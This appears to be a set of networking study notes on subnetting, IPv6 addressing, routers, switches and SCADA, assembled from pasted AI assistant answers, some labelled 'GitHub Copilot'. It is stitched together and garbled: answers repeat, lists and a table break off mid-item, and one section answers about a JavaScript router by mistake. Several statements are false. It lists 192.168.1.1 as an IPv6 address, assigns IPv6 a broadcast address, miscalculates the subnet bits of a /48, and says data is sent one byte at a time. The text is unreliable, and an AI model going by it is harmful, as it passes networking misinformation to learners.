<p>GitHub Copilot: Network subnetting is a process of dividing a larger network into smaller, more manageable pieces known as subnets. This is done for several reasons, including improving network performance, enhancing security, and better managing network resources.</p>
<p>Here's a basic explanation of how subnetting works:</p>
<ol>
<li>
<p><strong>IP Address</strong>: Every device on a network is assigned a unique IP address, which is divided into two parts: the network address and the host address. The network address identifies the network itself, while the host address identifies the specific device on that network.</p>
</li>
<li>
<p><strong>Subnet Mask</strong>: The subnet mask is used to determine which part of the IP address refers to the network and which part refers to the host. A subnet mask consists of 32 bits, some of which are set to 1 (representing the network) and some of which are set to 0 (representing the host).</p>
</li>
<li>
<p><strong>Subnetting</strong>: In subnetting, some of the bits that were originally part of the host address are borrowed and used as part of the network address. This effectively creates additional networks, or subnets.</p>
</li>
<li>
<p><strong>Subnet Address</strong>: Each subnet has its own unique subnet address, which is the first IP address in the subnet. Similarly, the last IP address in the subnet is known as the broadcast address, which is used to send data to all devices on the subnet.</p>
</li>
</ol>
<p>For example, consider a network with an IP address of <code>192.168.1.0</code> and a subnet mask of <code>255.255.255.0</code>. If you wanted to divide this network into two subnets, you could change the subnet mask to <code>255.255.255.128</code>. This would create two subnets: <code>192.168.1.0</code> to <code>192.168.1.127</code> and <code>192.168.1.128</code> to <code>192.168.1.255</code>.</p>
<p>Subnetting is a crucial skill for network administrators, as it allows for efficient allocation of IP addresses, reduces network congestion, and improves network security.</p>
<p>In networking, a byte is the basic unit of data transmission. It is a group of eight bits, each of which can be either 0 or 1. Bytes are used to represent all types of data, including text, images, audio, and video.</p>
<p>When data is transmitted over a network, it is broken down into bytes and sent one byte at a time. This is because most network devices can only handle data in byte-sized chunks.</p>
<p>Bytes are also used to measure the bandwidth of a network connection. Bandwidth is the amount of data that can be transmitted over a network connection in a given amount of time. Bandwidth is measured in bits per second (bps), bytes per second (Bps), or kilobytes per second (KBps).</p>
<p>Here are some examples of how bytes are used in networking:</p>
<ul>
<li>IP addresses are four bytes long.</li>
<li>TCP and UDP port numbers are two bytes long.</li>
<li>Ethernet frames are at least 64 bytes long.</li>
<li>ICMP packets are at least 20 bytes long.</li>
</ul>
<p>Bytes are an essential part of networking, and they are used in a variety of ways. By understanding how bytes are used in networking, you can better understand how networks work and how to troubleshoot network problems.</p>
<p>Here is a table showing the conversion between bits and bytes:</p>
<div class="table-wrapper"><table><thead><tr><th>Bits</th><th>Bytes</th></tr></thead><tbody>
<tr><td>8</td><td>1</td></tr>
<tr><td>16</td><td>2</td></tr>

<p>Subnetting is a process used in computer networking to divide a larger IP network into smaller, more manageable subnetworks, known as subnets. Subnetting provides several benefits, including more efficient IP address allocation, improved network management, and enhanced security. It allows network administrators to optimize network resources and organization.</p>
<p>Here are the key components and concepts related to network subnetting:</p>
<ol>
<li>
<p>IP Addresses: In the context of subnetting, IP addresses are typically represented in either IPv4 or IPv6 format. IPv4 uses a 32-bit address, while IPv6 uses a 128-bit address. We'll focus on IPv4 subnetting in this explanation, as it's more common.</p>
</li>
<li>
<p>Subnet Mask: A subnet mask is used to determine which portion of an IP address represents the network ID and which part represents the host ID. In an IPv4 address, the subnet mask is typically expressed as four sets of eight binary digits (e.g., 255.255.255.0) or in CIDR notation (e.g., /24).</p>
</li>
<li>
<p>Network ID and Host ID: An IP address is divided into two parts: the network ID and the host ID. The network ID identifies the subnet to which a device belongs, while the host ID identifies a specific device within that subnet.</p>
</li>
<li>
<p>Subnet Size: Subnet size refers to the number of available host addresses within a subnet. The subnet size depends on the subnet mask, with smaller subnet masks allowing for more host addresses per subnet and larger subnet masks resulting in fewer host addresses.</p>
</li>
<li>
<p>Subnetting Process: To subnet a network, you follow these general steps:
a. Start with a range of IP addresses assigned to your network.
b. Choose an appropriate subnet mask to divide the range into smaller subnets.
c. Calculate the number of subnets and hosts per subnet based on the chosen subnet mask.
d. Assign each subnet a unique network ID.
e. Allocate host addresses within each subnet.</p>
</li>
<li>
<p>Common Subnet Masks: There are several commonly used subnet masks in IPv4 subnetting, such as /24 (255.255.255.0), /16 (255.255.0.0), and /8 (255.0.0.0). Each of these masks results in a different number of subnets and hosts.</p>
</li>
<li>
<p>Classless Inter-Domain Routing (CIDR): CIDR notation is a more flexible way to represent subnet masks, using a slash followed by a number (e.g., /24). It allows for variable subnet sizes and is widely used in modern networking.</p>
</li>
<li>
<p>Subnetting Benefits: Subnetting allows for efficient IP address allocation, reduces network congestion, enhances security by isolating segments of the network, and simplifies network management and troubleshooting.</p>
</li>
</ol>
<p>Subnetting is a fundamental skill for network administrators and engineers, as it enables them to design and manage IP networks effectively, ensuring that resources are allocated efficiently and securely.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ipv6"><a class="header" href="#ipv6">IPv6</a></h1>
<p>IPv6 (Internet Protocol version 6) is the sixth version of the Internet Protocol (IP). It was developed to address the limitations of IPv4, such as the limited address space and the lack of support for mobility.</p>
<p>IPv6 addresses are 128-bit numbers that are typically represented in hexadecimal format. The hexadecimal format consists of eight groups of four hexadecimal digits, separated by colons.</p>
<p>Here are some examples of IPv6 addresses:</p>
<ul>
<li>2001:0db8:85a3:0000:0000:8a2e:0370:7334</li>
<li>fe80::0200:fffe:fe00:0000</li>
<li>192.168.1.1 (IPv4-compatible IPv6 address)</li>
</ul>
<p>IPv6 addresses are divided into different types, depending on the first few bits of the address. The types are as follows:</p>
<ul>
<li>Unicast addresses: These addresses are used to identify individual devices.</li>
<li>Multicast addresses: These addresses are used to send packets to groups of devices.</li>
<li>Anycast addresses: These addresses are used to send packets to the nearest device in a group of devices.</li>
<li>Link-local addresses: These addresses are used to communicate with devices on the same local network.</li>
</ul>
<p>IPv6 also supports a number of new features, such as:</p>
<ul>
<li>Stateless address autoconfiguration: This feature allows devices to automatically configure themselves with an IPv6 address without the need for a DHCP server.</li>
<li>Mobility support: IPv6 supports mobility, which means that devices can change their IP address without losing their connection to the network.</li>
<li>Built-in security: IPv6 has a number of built-in security features, such as IPsec authentication and encryption.</li>
</ul>
<p>IPv6 is still being deployed, but it is becoming more and more widely used. As the number of devices on the Internet continues to grow, IPv6 will become essential for addressing the limitations of IPv4.</p>
<p>Here are some examples of how IPv6 is being used today:</p>
<ul>
<li>Google uses IPv6 for all of its public services, including Search, Gmail, and YouTube.</li>
<li>Microsoft uses IPv6 for all of its cloud services, including Azure and Office 365.</li>
<li>Amazon uses IPv6 for all of its AWS services.</li>
<li>Many mobile network operators are deploying IPv6 on their networks.</li>
</ul>
<p>If you are interested in learning more about IPv6, there are a number of resources available online.</p>

<p>IPv6 (Internet Protocol version 6) is the most recent version of the Internet Protocol, designed to address the limitations of its predecessor, IPv4. IPv6 uses a 128-bit address format, expressed as eight groups of four hexadecimal digits separated by colons (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334). Here are some examples of IPv6 addresses:</p>
<ol>
<li>
<p><strong>2001:0db8:85a3:0000:0000:8a2e:0370:7334</strong>: This is a generic example of an IPv6 address. The 2001:0db8 prefix is often used as a reserved example address in documentation and testing. The remaining groups represent the unique identifier for a specific device or network.</p>
</li>
<li>
<p><strong>2001:0:9d38:6ab8:3c01:7080:2103:3d24</strong>: Another example of an IPv6 address, demonstrating the longer format and wider address space of IPv6.</p>
</li>
<li>
<p><strong>2001:db8::1</strong>: This is a simplified form of an IPv6 address that uses double colons to represent consecutive blocks of zeroes. It's equivalent to &quot;2001:0:db8:0:0:0:0:1.&quot;</p>
</li>
<li>
<p><strong>::1</strong>: This is the IPv6 loopback address, equivalent to IPv4's &quot;127.0.0.1.&quot; It's used to establish network connections with the local host (the device itself).</p>
</li>
<li>
<p><strong>fe80::1</strong>: An example of a link-local address in IPv6. These addresses are used for communication within a single network segment and are automatically assigned by devices when they connect to the network.</p>
</li>
<li>
<p><strong>2001:4860:4860::8888</strong>: This is one of Google's public DNS server IPv6 addresses. It's used for resolving domain names into IPv6 addresses.</p>

<p>IPv6 provides a significantly larger address space compared to IPv4, which was essential due to the impending exhaustion of IPv4 addresses. The use of hexadecimal notation and the double colon (::) for zero compression makes IPv6 addresses longer but more flexible. IPv6 offers benefits such as improved scalability, enhanced security, and simplified network management, making it essential for the continued growth of the internet.</p>
<p>GitHub Copilot: IPv6, or Internet Protocol version 6, is the most recent version of the Internet Protocol, the communications protocol that provides an identification and location system for computers on networks and routes traffic across the Internet. It was developed by the Internet Engineering Task Force (IETF) to deal with the long-anticipated problem of IPv4 address exhaustion.</p>
<p>IPv6 uses 128-bit addresses, allowing for a significantly larger number of addresses compared to the 32-bit address space of IPv4. This means that there are 2^128, or about 3.4×10^38 unique IPv6 addresses.</p>
<p>IPv6 addresses are represented as eight groups of four hexadecimal digits, each group representing 16 bits (two octets, a group also known as a hextet), and the groups are separated by colons (:). An example of an IPv6 address is <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>.</p>
<p>Here are some special types of IPv6 addresses:</p>
<ol>
<li>
<p><strong>Unspecified Address</strong>: The address <code>0:0:0:0:0:0:0:0</code> (or <code>::</code> for short) is called the unspecified address. It's typically used in software when the address is unknown or irrelevant.</p>
</li>
<li>
<p><strong>Loopback Address</strong>: The address <code>0:0:0:0:0:0:0:1</code> (or <code>::1</code> for short) is the loopback address. Just like <code>127.0.0.1</code> in IPv4, it's used when a device wants to send a message to itself.</p>
</li>
<li>
<p><strong>Global Unicast Addresses</strong>: These are the IPv6 equivalent of IPv4's public addresses. They're globally routable and reachable on the IPv6 Internet. An example of a global unicast address is <code>2001:0db8:85a3::8a2e:0370:7334</code>.</p>
</li>
<li>
<p><strong>Link-Local Addresses</strong>: These addresses are used for communication between nodes on the same link (nodes on the same subnet). These addresses are not routable and the scope is the local link. An example of a link-local address is <code>fe80::1ff:fe23:4567:890a</code>.</p>
</li>
<li>
<p><strong>Unique Local Addresses (ULAs)</strong>: These are the equivalent of IPv4's private addresses. They're used for local addressing within a private network. An example of a ULA is <code>fd00::1ff:fe23:4567:890a</code>.</p>
</li>
<li>
<p><strong>Multicast Addresses</strong>: These are used to send a single packet to multiple destinations. An example of a multicast address is <code>ff02::1</code>, which represents all nodes on the local network segment.</p>
</li>
</ol>
<p>Understanding IPv6 addressing is becoming increasingly important as the adoption of IPv6 grows. IPv6 is the future of the Internet, and it's important to understand how it works.</p>

<p>IPv6 subnetting is the process of dividing an IPv6 address block into smaller networks. It is similar to IPv4 subnetting, but there are some key differences.</p>
<p>IPv6 addresses are 128 bits long, while IPv4 addresses are 32 bits long. This means that there is much more address space available in IPv6, which makes it easier to subnet.</p>
<p>Another difference between IPv6 and IPv4 subnetting is that IPv6 uses a prefix length instead of a subnet mask. The prefix length specifies how many bits of the IP address are used for the network prefix and how many bits are used for the host address.</p>
<p>For example, a prefix length of 64 means that the first 64 bits of the IP address are used for the network prefix and the last 64 bits are used for the host address. This creates a subnet with 2^64 host addresses.</p>
<p>IPv6 subnets are typically written in CIDR notation. CIDR notation is a way of writing an IP address and its prefix length in a single line. For example, the subnet 2001:db8:1::/64 is written as 2001:db8:1::/64 in CIDR notation.</p>
<p>To subnet an IPv6 address block, you need to choose a prefix length. The prefix length should be large enough to accommodate all of the devices in your subnet, but small enough to conserve address space.</p>
<p>Once you have chosen a prefix length, you can use a subnet calculator to calculate the network address and broadcast address for the subnet. The subnet calculator will also tell you how many host addresses are available in the subnet.</p>
<p>Here is an example of how to subnet an IPv6 address block:</p>
<pre><code>Address block: 2001:db8:1::/48
Prefix length: 64

Network address: 2001:db8:1::
Broadcast address: 2001:db8:1::ffff
Number of host addresses: 2^64
</code></pre>
<p>You can then divide the subnet into smaller subnets by choosing a larger prefix length. For example, you could divide the /64 subnet into /66 subnets, /68 subnets, and so on.</p>
<p>IPv6 subnetting is a complex topic, but this is a brief overview of the basics. I hope this is helpful!</p>
<p>GitHub Copilot: In IPv6, the concept of a subnet mask as used in IPv4 does not exist. Instead, IPv6 uses prefix lengths, similar to how CIDR notation works in IPv4.</p>
<p>The prefix length in IPv6 is the equivalent of a subnet mask, as it indicates the portion of the address which denotes the network prefix and the portion which denotes the host address. The prefix is indicated by the number of bits used for the network prefix, which is appended to the IPv6 address after a slash (/).</p>
<p>For example, in the IPv6 address <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334/64</code>, the <code>/64</code> at the end is the prefix length. This means that the first 64 bits of the address (i.e., <code>2001:0db8:85a3:0000</code>) are the network prefix, and the remaining 64 bits (i.e., <code>0000:8a2e:0370:7334</code>) are used for host addresses within that network.</p>
<p>This method of denoting the network prefix simplifies the process of subnetting and routing as compared to IPv4. It also allows for a much larger number of individual host addresses within each network, given the larger address space of IPv6.</p>
<p>IPv6 doesn't use traditional subnet masks like IPv4. Instead, it uses a different notation called CIDR (Classless Inter-Domain Routing) to denote the network prefix length. In IPv6, the network prefix is represented as a slash followed by the number of bits in the prefix. For example, a common IPv6 network prefix is /64, which means the first 64 bits of the address represent the network, and the remaining 64 bits are for host addressing.</p>
<p>Here's a brief overview of common IPv6 network prefixes:</p>
<ol>
<li>
<p><strong>/64 Prefix</strong>: This is the most commonly used prefix length and is recommended for individual subnets. It provides a vast number of host addresses, making it suitable for most scenarios.</p>
</li>
<li>
<p><strong>/48 Prefix</strong>: Typically used by organizations for larger networks or when they need to allocate multiple /64 subnets. This provides 65,536 individual subnets, each with a /64 length.</p>
</li>
<li>
<p><strong>/56 Prefix</strong>: Smaller organizations or small businesses may be allocated a /56 prefix by their Internet Service Provider (ISP). This provides 256 individual /64 subnets.</p>
</li>
<li>
<p><strong>/60 Prefix</strong>: Less common but sometimes used for smaller networks or branch offices. It provides 16 individual /64 subnets.</p>
</li>
</ol>
<p>The use of a fixed-length network prefix in IPv6 simplifies routing and addressing, as it eliminates the need for complex subnet masks like in IPv4. However, because of the large address space in IPv6, you can create a substantial number of subnets and still have an abundance of host addresses available in each subnet.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="subnetting-ipv6"><a class="header" href="#subnetting-ipv6">Subnetting IPv6</a></h1>
<p>GitHub Copilot: Subnetting in IPv6 works similarly to how it does in IPv4, but with a few key differences due to the larger address space and different address format of IPv6.</p>
<p>In IPv6, the address is divided into two parts: the network prefix and the interface identifier. The network prefix identifies the network itself, while the interface identifier identifies a specific device on that network.</p>
<p>The network prefix is often written as a / followed by a number, which represents the number of bits in the network prefix. For example, in the address <code>2001:db8:abcd:0012::/64</code>, the network prefix is <code>2001:db8:abcd:0012</code>, and it is 64 bits long.</p>
<p>Subnetting in IPv6 is done by dividing the network prefix into additional subnets. This is done by extending the network prefix by additional bits. For example, you could divide the <code>2001:db8:abcd:0012::/64</code> network into multiple /65 networks, such as <code>2001:db8:abcd:0012:0::/65</code> and <code>2001:db8:abcd:0012:8000::/65</code>.</p>
<p>Here are a few key points about IPv6 subnetting:</p>
<ol>
<li>
<p><strong>Larger Address Space</strong>: Because IPv6 has a much larger address space than IPv4, it's possible to have a much larger number of subnets. This can make network management easier and more flexible.</p>
</li>
<li>
<p><strong>/64 Subnets</strong>: It's common practice to use /64 subnets in IPv6. This leaves 64 bits for the interface identifier, which is often automatically generated based on the MAC address of the device.</p>
</li>
<li>
<p><strong>No Subnet Zero</strong>: Unlike in IPv4, in IPv6 there is no concept of &quot;subnet zero&quot;. This means that all possible subnet IDs can be used.</p>
</li>
<li>
<p><strong>Subnetting on Nibble Boundaries</strong>: It's often recommended to subnet on nibble (4-bit) boundaries. This makes the subnetting structure easier to understand and work with, as each hexadecimal digit in an IPv6 address represents 4 bits.</p>
</li>
<li>
<p><strong>No Need for NAT</strong>: Because of the large address space of IPv6, there's no need for Network Address Translation (NAT). Each device can have its own unique public IPv6 address.</p>
</li>
</ol>
<p>Remember, while IPv6 does provide a larger address space, it's still important to plan your subnetting structure carefully to ensure efficient use of the address space and to keep your network manageable.</p>
<p>IPv6 subnetting is the process of dividing an IPv6 address space into smaller, more manageable subnets. IPv6, with its vast 128-bit address space, provides flexibility in subnetting and allows for efficient utilization of addresses. IPv6 subnetting is essential for organizing and managing networks, and it is typically accomplished using the following steps:</p>
<ol>
<li>
<p><strong>Choose the Network Prefix</strong>: The first step in IPv6 subnetting is to determine the network prefix or the number of bits allocated to the network portion of the address. This is typically done using CIDR notation, which specifies how many bits are in the network prefix. For example, /48, /56, or /64 are common choices.</p>
</li>
<li>
<p><strong>Determine the Subnet Prefix Length</strong>: Decide how many bits you want to allocate for subnets within your network. The subnet prefix length will determine the number of subnets and the number of host addresses within each subnet. It's common to use /64 for individual subnets, as it provides a large number of host addresses and is the recommended size for most networks.</p>
</li>
<li>
<p><strong>Calculate Subnet ID</strong>: Calculate the subnet ID by splitting the remaining bits from the network prefix into equal-sized subnets. For example, if you have a /48 network and you want to create multiple /64 subnets, you might allocate a certain number of bits for subnetting within the /48.</p>
</li>
<li>
<p><strong>Assign Subnet IDs</strong>: Assign specific subnet IDs to each subnet within your network based on your calculations. These IDs are used to identify individual subnets.</p>
</li>
<li>
<p><strong>Assign Host Addresses</strong>: Within each subnet, you can assign host addresses. A /64 subnet provides a vast number of host addresses, so you can allocate addresses as needed to devices and systems.</p>
</li>
</ol>
<p>Here's an example of IPv6 subnetting:</p>
<p>Suppose you have a /48 IPv6 address block, and you want to subnet it to create multiple /64 subnets for different departments in your organization.</p>
<ol>
<li>
<p>You start with the /48 prefix: 2001:0db8:1234:0000::/48.</p>
</li>
<li>
<p>You decide to allocate 16 bits for subnetting within your /48 network.</p>
</li>
<li>
<p>This leaves you with 32 bits for subnet IDs. You can create 2^32 (over 4 billion) unique /64 subnets within your /48 network.</p>
</li>
<li>
<p>You allocate specific subnet IDs to each department. For example:</p>
<ul>
<li>Marketing: 2001:0db8:1234:0000::/64</li>
<li>Sales: 2001:0db8:1234:0001::/64</li>
<li>IT: 2001:0db8:1234:0002::/64</li>
<li>Engineering: 2001:0db8:1234:0003::/64</li>
</ul>
</li>
<li>
<p>Within each /64 subnet, you can assign host addresses to devices as needed.</p>
</li>
</ol>
<p>IPv6 subnetting provides great flexibility and allows you to create subnets for various purposes while efficiently using IPv6 addresses. It's important to plan your subnetting carefully to meet your network's current and future requirements.</p>

<p>These are just a few examples of the many different kinds of network devices that are available. The specific devices that you need will depend on your network topology and requirements.</p>
<p>Network devices are hardware or software components that are essential for the operation and management of computer networks. They play various roles in facilitating communication, connectivity, and data transfer within networks. Here are some different types of network devices:</p>
<ol>
<li>
<p><strong>Router</strong>: Routers are fundamental network devices that connect different networks and determine the best path for data to travel between them.

<div style="break-before: page; page-break-before: always;"></div><h1 id="router"><a class="header" href="#router">Router</a></h1>
<p>A router is a network device that connects two or more networks together. It works by routing traffic between networks based on IP addresses. Routers are essential for connecting computers and other devices to the internet.</p>
<p><strong>How Routers Work</strong></p>
<p>When a device sends a packet of data, the router looks at the destination IP address in the packet header. The router then consults its routing table to determine the best path to send the packet. The routing table is a list of IP addresses and the corresponding ports that should be used to reach those addresses.</p>
<p>Once the router has determined the best path to send the packet, it forwards the packet to the next hop on the route. The next hop is typically another router or a device that is connected to the destination network.</p>
<p>Routers use a variety of algorithms to determine the best path to send packets. These algorithms take into account factors such as the distance between routers, the bandwidth of links, and the congestion of networks.</p>
<p><strong>Types of Routers</strong></p>
<p>There are many different types of routers, but they can be broadly divided into two categories: wired routers and wireless routers.</p>
<ul>
<li><strong>Wired routers</strong> connect devices to a network using Ethernet cables.</li>
<li><strong>Wireless routers</strong> connect devices to a network using radio waves.</li>
</ul>
<p>Wireless routers are more common in homes and small businesses, while wired routers are more common in large businesses and data centers.</p>
<p><strong>Benefits of Routers</strong></p>
<p>Routers offer a number of benefits, including:</p>
<ul>
<li><strong>Improved network performance:</strong> Routers can help to improve network performance by routing traffic efficiently. This can help to reduce latency and improve the overall speed of the network.</li>
<li><strong>Increased network security:</strong> Routers can help to increase network security by filtering traffic based on IP addresses. This can help to prevent unauthorized access to the network.</li>
<li><strong>Improved network flexibility:</strong> Routers can help to improve network flexibility by allowing multiple networks to be connected together. This can be useful for businesses that have multiple locations or for homes that have multiple devices.</li>
</ul>
<p><strong>How to Choose a Router</strong></p>
<p>When choosing a router, it is important to consider the following factors:</p>
<ul>
<li><strong>The number of devices that will be connected to the network:</strong> The router should have enough ports to connect all of the devices that will be used on the network.</li>
<li><strong>The speed of the network:</strong> The router should be able to support the speed of the network.</li>
<li><strong>The range of the network:</strong> The router should be able to provide coverage for the entire area where the network will be used.</li>
<li><strong>The security features of the router:</strong> The router should have a variety of security features to protect the network from unauthorized access.</li>
</ul>
<p><strong>Conclusion</strong></p>
<p>Routers are essential for connecting computers and other devices to the internet. They offer a number of benefits, including improved network performance, increased network security, and improved network flexibility. When choosing a router, it is important to consider the factors that are most important to you.</p>
<p>GitHub Copilot: A router is a networking device that forwards data packets between computer networks. Routers perform the traffic directing functions on the Internet. The most familiar type of routers are home and small office routers that simply forward IP packets between the home computers and the Internet.</p>
<p>Here's a simplified explanation of how a router works:</p>
<ol>
<li>
<p><strong>Connection to the Internet</strong>: A router is typically connected to at least two networks, commonly two LANs (Local Area Networks), WANs (Wide Area Network), WLANs (Wireless LAN), or a LAN and its ISP's network. Routers are located at gateways, the places where two or more networks connect.</p>
</li>
<li>
<p><strong>IP Addressing</strong>: Each router has a set IP address that other devices on the network use to access it. This IP address is set either manually by an administrator, or it's assigned automatically if the router is set to do so (DHCP).</p>
</li>
<li>
<p><strong>Packet Forwarding</strong>: When a data packet comes in on one of the lines, the router reads the network address in the packet header to determine the ultimate destination. Then, using information in its routing table or routing policy, it directs the packet to the next network on its journey.</p>
</li>
<li>
<p><strong>Routing Table</strong>: The routing table stores information on which connections lead to particular groups of addresses, prioritizes connections, and organizes the data traffic.</p>
</li>
<li>
<p><strong>NAT (Network Address Translation)</strong>: Routers in homes and small offices often use a feature called NAT which allows multiple devices to share a single IP address.</p>
</li>
<li>
<p><strong>Firewall</strong>: Routers also often contain a built-in firewall to help protect the network from intruders.</p>
</li>
<li>
<p><strong>Wireless Capability</strong>: Many routers today also have built-in wireless capabilities. They act as a wireless access point, so devices can connect to the network without being physically wired to the router.</p>
</li>
<li>
<p><strong>Quality of Service</strong>: Some routers offer a Quality of Service (QoS) feature. QoS prioritizes traffic to ensure that important data gets through the network faster.</p>
</li>
</ol>
<p>Remember, the primary function of a router is to connect networks together and keep the data flowing between them. They are essential for directing traffic and ensuring data gets where it needs to go on a network.</p>
<p>A router is a fundamental network device that operates at the network layer (Layer 3) of the OSI model. It is responsible for connecting different networks and determining the best path for data to travel between them. Routers are critical for the functioning of the Internet and local area networks (LANs). Here's how a router works and its key functions:</p>
<ol>
<li>
<p><strong>Packet Forwarding</strong>: Routers receive data in the form of packets from various devices on a network. Each packet contains a source and destination IP address. The router inspects the destination IP address and makes decisions on how to forward the packet to the appropriate destination. It uses a routing table that contains information about known networks and the best paths to reach them.</p>
</li>
<li>
<p><strong>Routing Table</strong>: A router maintains a routing table that contains information about the available networks and the paths (routes) to reach them. Each entry in the table includes a network address, a subnet mask, and the next hop (the next router or destination) for that network. Routers use this table to make forwarding decisions. The routing table is built through dynamic routing protocols or manual configuration.</p>
</li>
<li>
<p><strong>Interconnecting Networks</strong>: Routers are used to interconnect different networks with different IP address ranges. For example, a router can connect a local LAN to the internet, acting as a gateway for devices on the LAN to communicate with resources on the internet.</p>
</li>
<li>
<p><strong>Network Address Translation (NAT)</strong>: In many cases, routers perform Network Address Translation (NAT). NAT allows multiple devices on a LAN to share a single public IP address (usually assigned by an Internet Service Provider). The router keeps track of which devices requested what data, and it translates internal private IP addresses to the single public IP address for internet communication.</p>
</li>
<li>
<p><strong>Security and Firewall</strong>: Routers often include firewall capabilities to control incoming and outgoing network traffic based on predefined security rules. They can block or allow traffic based on source and destination IP addresses, ports, and protocols, enhancing network security.</p>
</li>
<li>
<p><strong>Quality of Service (QoS)</strong>: Some routers support Quality of Service (QoS) features, which allow network administrators to prioritize certain types of traffic, ensuring that critical applications receive the necessary bandwidth and low latency.</p>
</li>
<li>
<p><strong>Dynamic Routing</strong>: Routers can use dynamic routing protocols (e.g., OSPF, BGP) to exchange routing information with other routers in order to adapt to changes in the network. This dynamic routing allows routers to automatically adjust their routing tables to find the most efficient path to a destination.</p>
</li>
<li>
<p><strong>Subnetting</strong>: Routers can also be used to divide a larger IP network into smaller subnets. This is an essential part of managing and optimizing network resources.</p>
</li>
<li>
<p><strong>Diagnostic and Monitoring Tools</strong>: Routers often include diagnostic and monitoring tools that help network administrators troubleshoot network issues, view network statistics, and analyze traffic patterns.</p>
</li>
</ol>
<p>Routers are an integral part of modern network infrastructure, and they are responsible for ensuring that data is routed efficiently and securely across networks, whether it's within a local network or on the global internet. Their ability to make intelligent decisions based on destination IP addresses makes them a crucial component for connecting networks of all sizes.</p>

<p><strong>SCADA (Supervisory Control and Data Acquisition)</strong> is a computer-based system used for controlling and monitoring machines and processes based on real-time data². It is a collection of software and hardware components used for industrial automation which enables managers, engineers, and other industry workers to communicate effectively with the working environment².</p>
<p>Here's how a SCADA system works:</p>
<ol>
<li>
<p><strong>Sensors and Actuators</strong>: Sensors gather data based on physical characteristics like temperature or pressure and transmit it to the SCADA system. Actuators use the data to take a certain action².</p>
</li>
<li>
<p><strong>Supervisory Computers</strong>: These collect data from the sensors, analyze it, make decisions based on it, and send commands to the actuators².</p>
</li>
<li>
<p><strong>SCADA Field Controllers</strong>: These devices are located near the field where the process is being controlled. They collect data from sensors, send it to the supervisory computer, and receive commands from the supervisory computer which are afterward sent to the actuators².</p>
</li>
<li>
<p><strong>Human-Machine Interface (HMI)</strong>: A software application or hardware device that allows operators and engineers to interact with the SCADA system by displaying information in a graphical format².</p>
</li>
<li>
<p><strong>Communication Infrastructure</strong>: This represents the network of devices and communication protocols used to transmit data between components of SCADA systems².</p>
</li>
</ol>
<p>SCADA systems obtain and collect data from sensors and network devices attached to PLCs or RTUs before converting it into a central control room where it can be analyzed and displayed on HMI into information that humans can understand². The control room operator can then use this information to make decisions and control the remote equipment².</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="router-examples"><a class="header" href="#router-examples">Router examples</a></h1>
<p>It seems like you're asking about router examples, but you didn't specify a programming language or a framework. </p>
<p>For instance, if you're asking about Express.js (a Node.js framework), a basic router example would look like this:</p>
<pre><code class="language-javascript">const express = require('express');
const router = express.Router();

router.get('/', function(req, res) {
  res.send('Hello World!');
});

module.exports = router;
</code></pre>
<p>This code creates a new router object, defines a route on it, and then exports the router. The route responds with 'Hello World!' when a GET request is made to the root URL.</p>
<p>If you're asking about a different language or framework, please provide more details.</p>
<p>Certainly! Here are some examples of different types of routers:</p>
<ol>
<li>

<div style="break-before: page; page-break-before: always;"></div><h1 id="switch"><a class="header" href="#switch">Switch</a></h1>
<p>GitHub Copilot: A network switch is a networking device that connects devices together on a computer network. It uses packet switching to receive, process, and forward data to the destination device. Unlike a network hub, which broadcasts the same data to all its ports, a network switch forwards data only to those devices that the data is intended for.</p>
<p>Here's a simplified explanation of how a network switch works:</p>
<ol>
<li>
<p><strong>Connection of Devices</strong>: A switch connects various devices on a network such as computers, printers, servers, and other switches. The devices connected to a switch are often referred to as its ports.</p>
</li>
<li>
<p><strong>MAC Addressing</strong>: Each device connected to a switch has a unique Media Access Control (MAC) address. When a device sends data to another device, it includes the MAC address of the device it is trying to communicate with.</p>
</li>
<li>
<p><strong>Data Transmission</strong>: When a data frame arrives at a switch port, the switch reads the MAC address of the device the data is intended for. It then looks at its MAC address table to determine which port the intended device is connected to.</p>
</li>
<li>
<p><strong>Forwarding Data</strong>: Once the switch knows which port the intended device is connected to, it forwards the data frame directly to that port, instead of broadcasting the data out of all its ports like a hub would do.</p>
</li>
<li>
<p><strong>Learning MAC Addresses</strong>: When a device sends data through the switch, the switch learns the MAC address of the device and adds it to its MAC address table. This table is used to remember which devices are connected to which ports.</p>
</li>
<li>
<p><strong>Full-Duplex Communication</strong>: Switches allow for full-duplex communication, meaning devices can send and receive data at the same time. This is different from hubs, which allow only half-duplex communication (devices can either send or receive data, but not at the same time).</p>
</li>
</ol>
<p>Switches play a crucial role in managing the flow of data on a network by allowing devices to communicate more efficiently, reducing unnecessary traffic, and thereby increasing overall network performance.</p>
<p>A network switch is a fundamental networking device that operates at the data link layer (Layer 2) of the OSI model. Its primary function is to connect devices within the same local area network (LAN) and facilitate the efficient transfer of data frames between them. Switches are commonly used in Ethernet networks to create and manage LAN segments. Here's how a switch works and its key functions:</p>
<ol>
<li>
<p><strong>Frame Forwarding</strong>: A switch receives data in the form of Ethernet frames from various devices connected to its ports. Each frame includes a source MAC address and a destination MAC address. The switch examines the destination MAC address to determine which port the frame should be forwarded to.</p>
</li>
<li>
<p><strong>MAC Address Table</strong>: A switch maintains a MAC address table, also known as a CAM (Content Addressable Memory) table, which contains entries mapping MAC addresses to the switch's ports. When a frame arrives, the switch records the source MAC address along with the port it arrived on in the MAC address table.</p>
</li>
<li>
<p><strong>Switching Decision</strong>: When a frame with a destination MAC address arrives at the switch, it checks the MAC address table to determine which port is associated with that destination address. If it finds a match, the switch forwards the frame only to the port where the destination device is located. This process is known as unicast forwarding.</p>
</li>
<li>
<p><strong>Broadcast and Unknown Unicast Handling</strong>: If the destination MAC address is not found in the MAC address table (unknown unicast) or if the frame is a broadcast frame (sent to all devices in the segment), the switch will broadcast the frame to all its ports except the one it arrived on. This is because the switch does not yet have information about the destination device's location.</p>
</li>
<li>
<p><strong>Collision Domain Isolation</strong>: Unlike hubs, which share the same collision domain and can lead to network collisions, switches create separate collision domains for each port. This collision domain isolation significantly reduces network collisions and improves network performance.</p>
</li>
<li>
<p><strong>VLAN Support</strong>: Some switches support Virtual LANs (VLANs), which allow you to segment a single physical switch into multiple virtual networks. VLANs enable network administrators to logically separate devices and traffic on a single physical switch.</p>
</li>
<li>
<p><strong>Duplex Operation</strong>: Switches allow devices to operate in full-duplex mode, where devices can send and receive data simultaneously, enhancing network efficiency.</p>
</li>
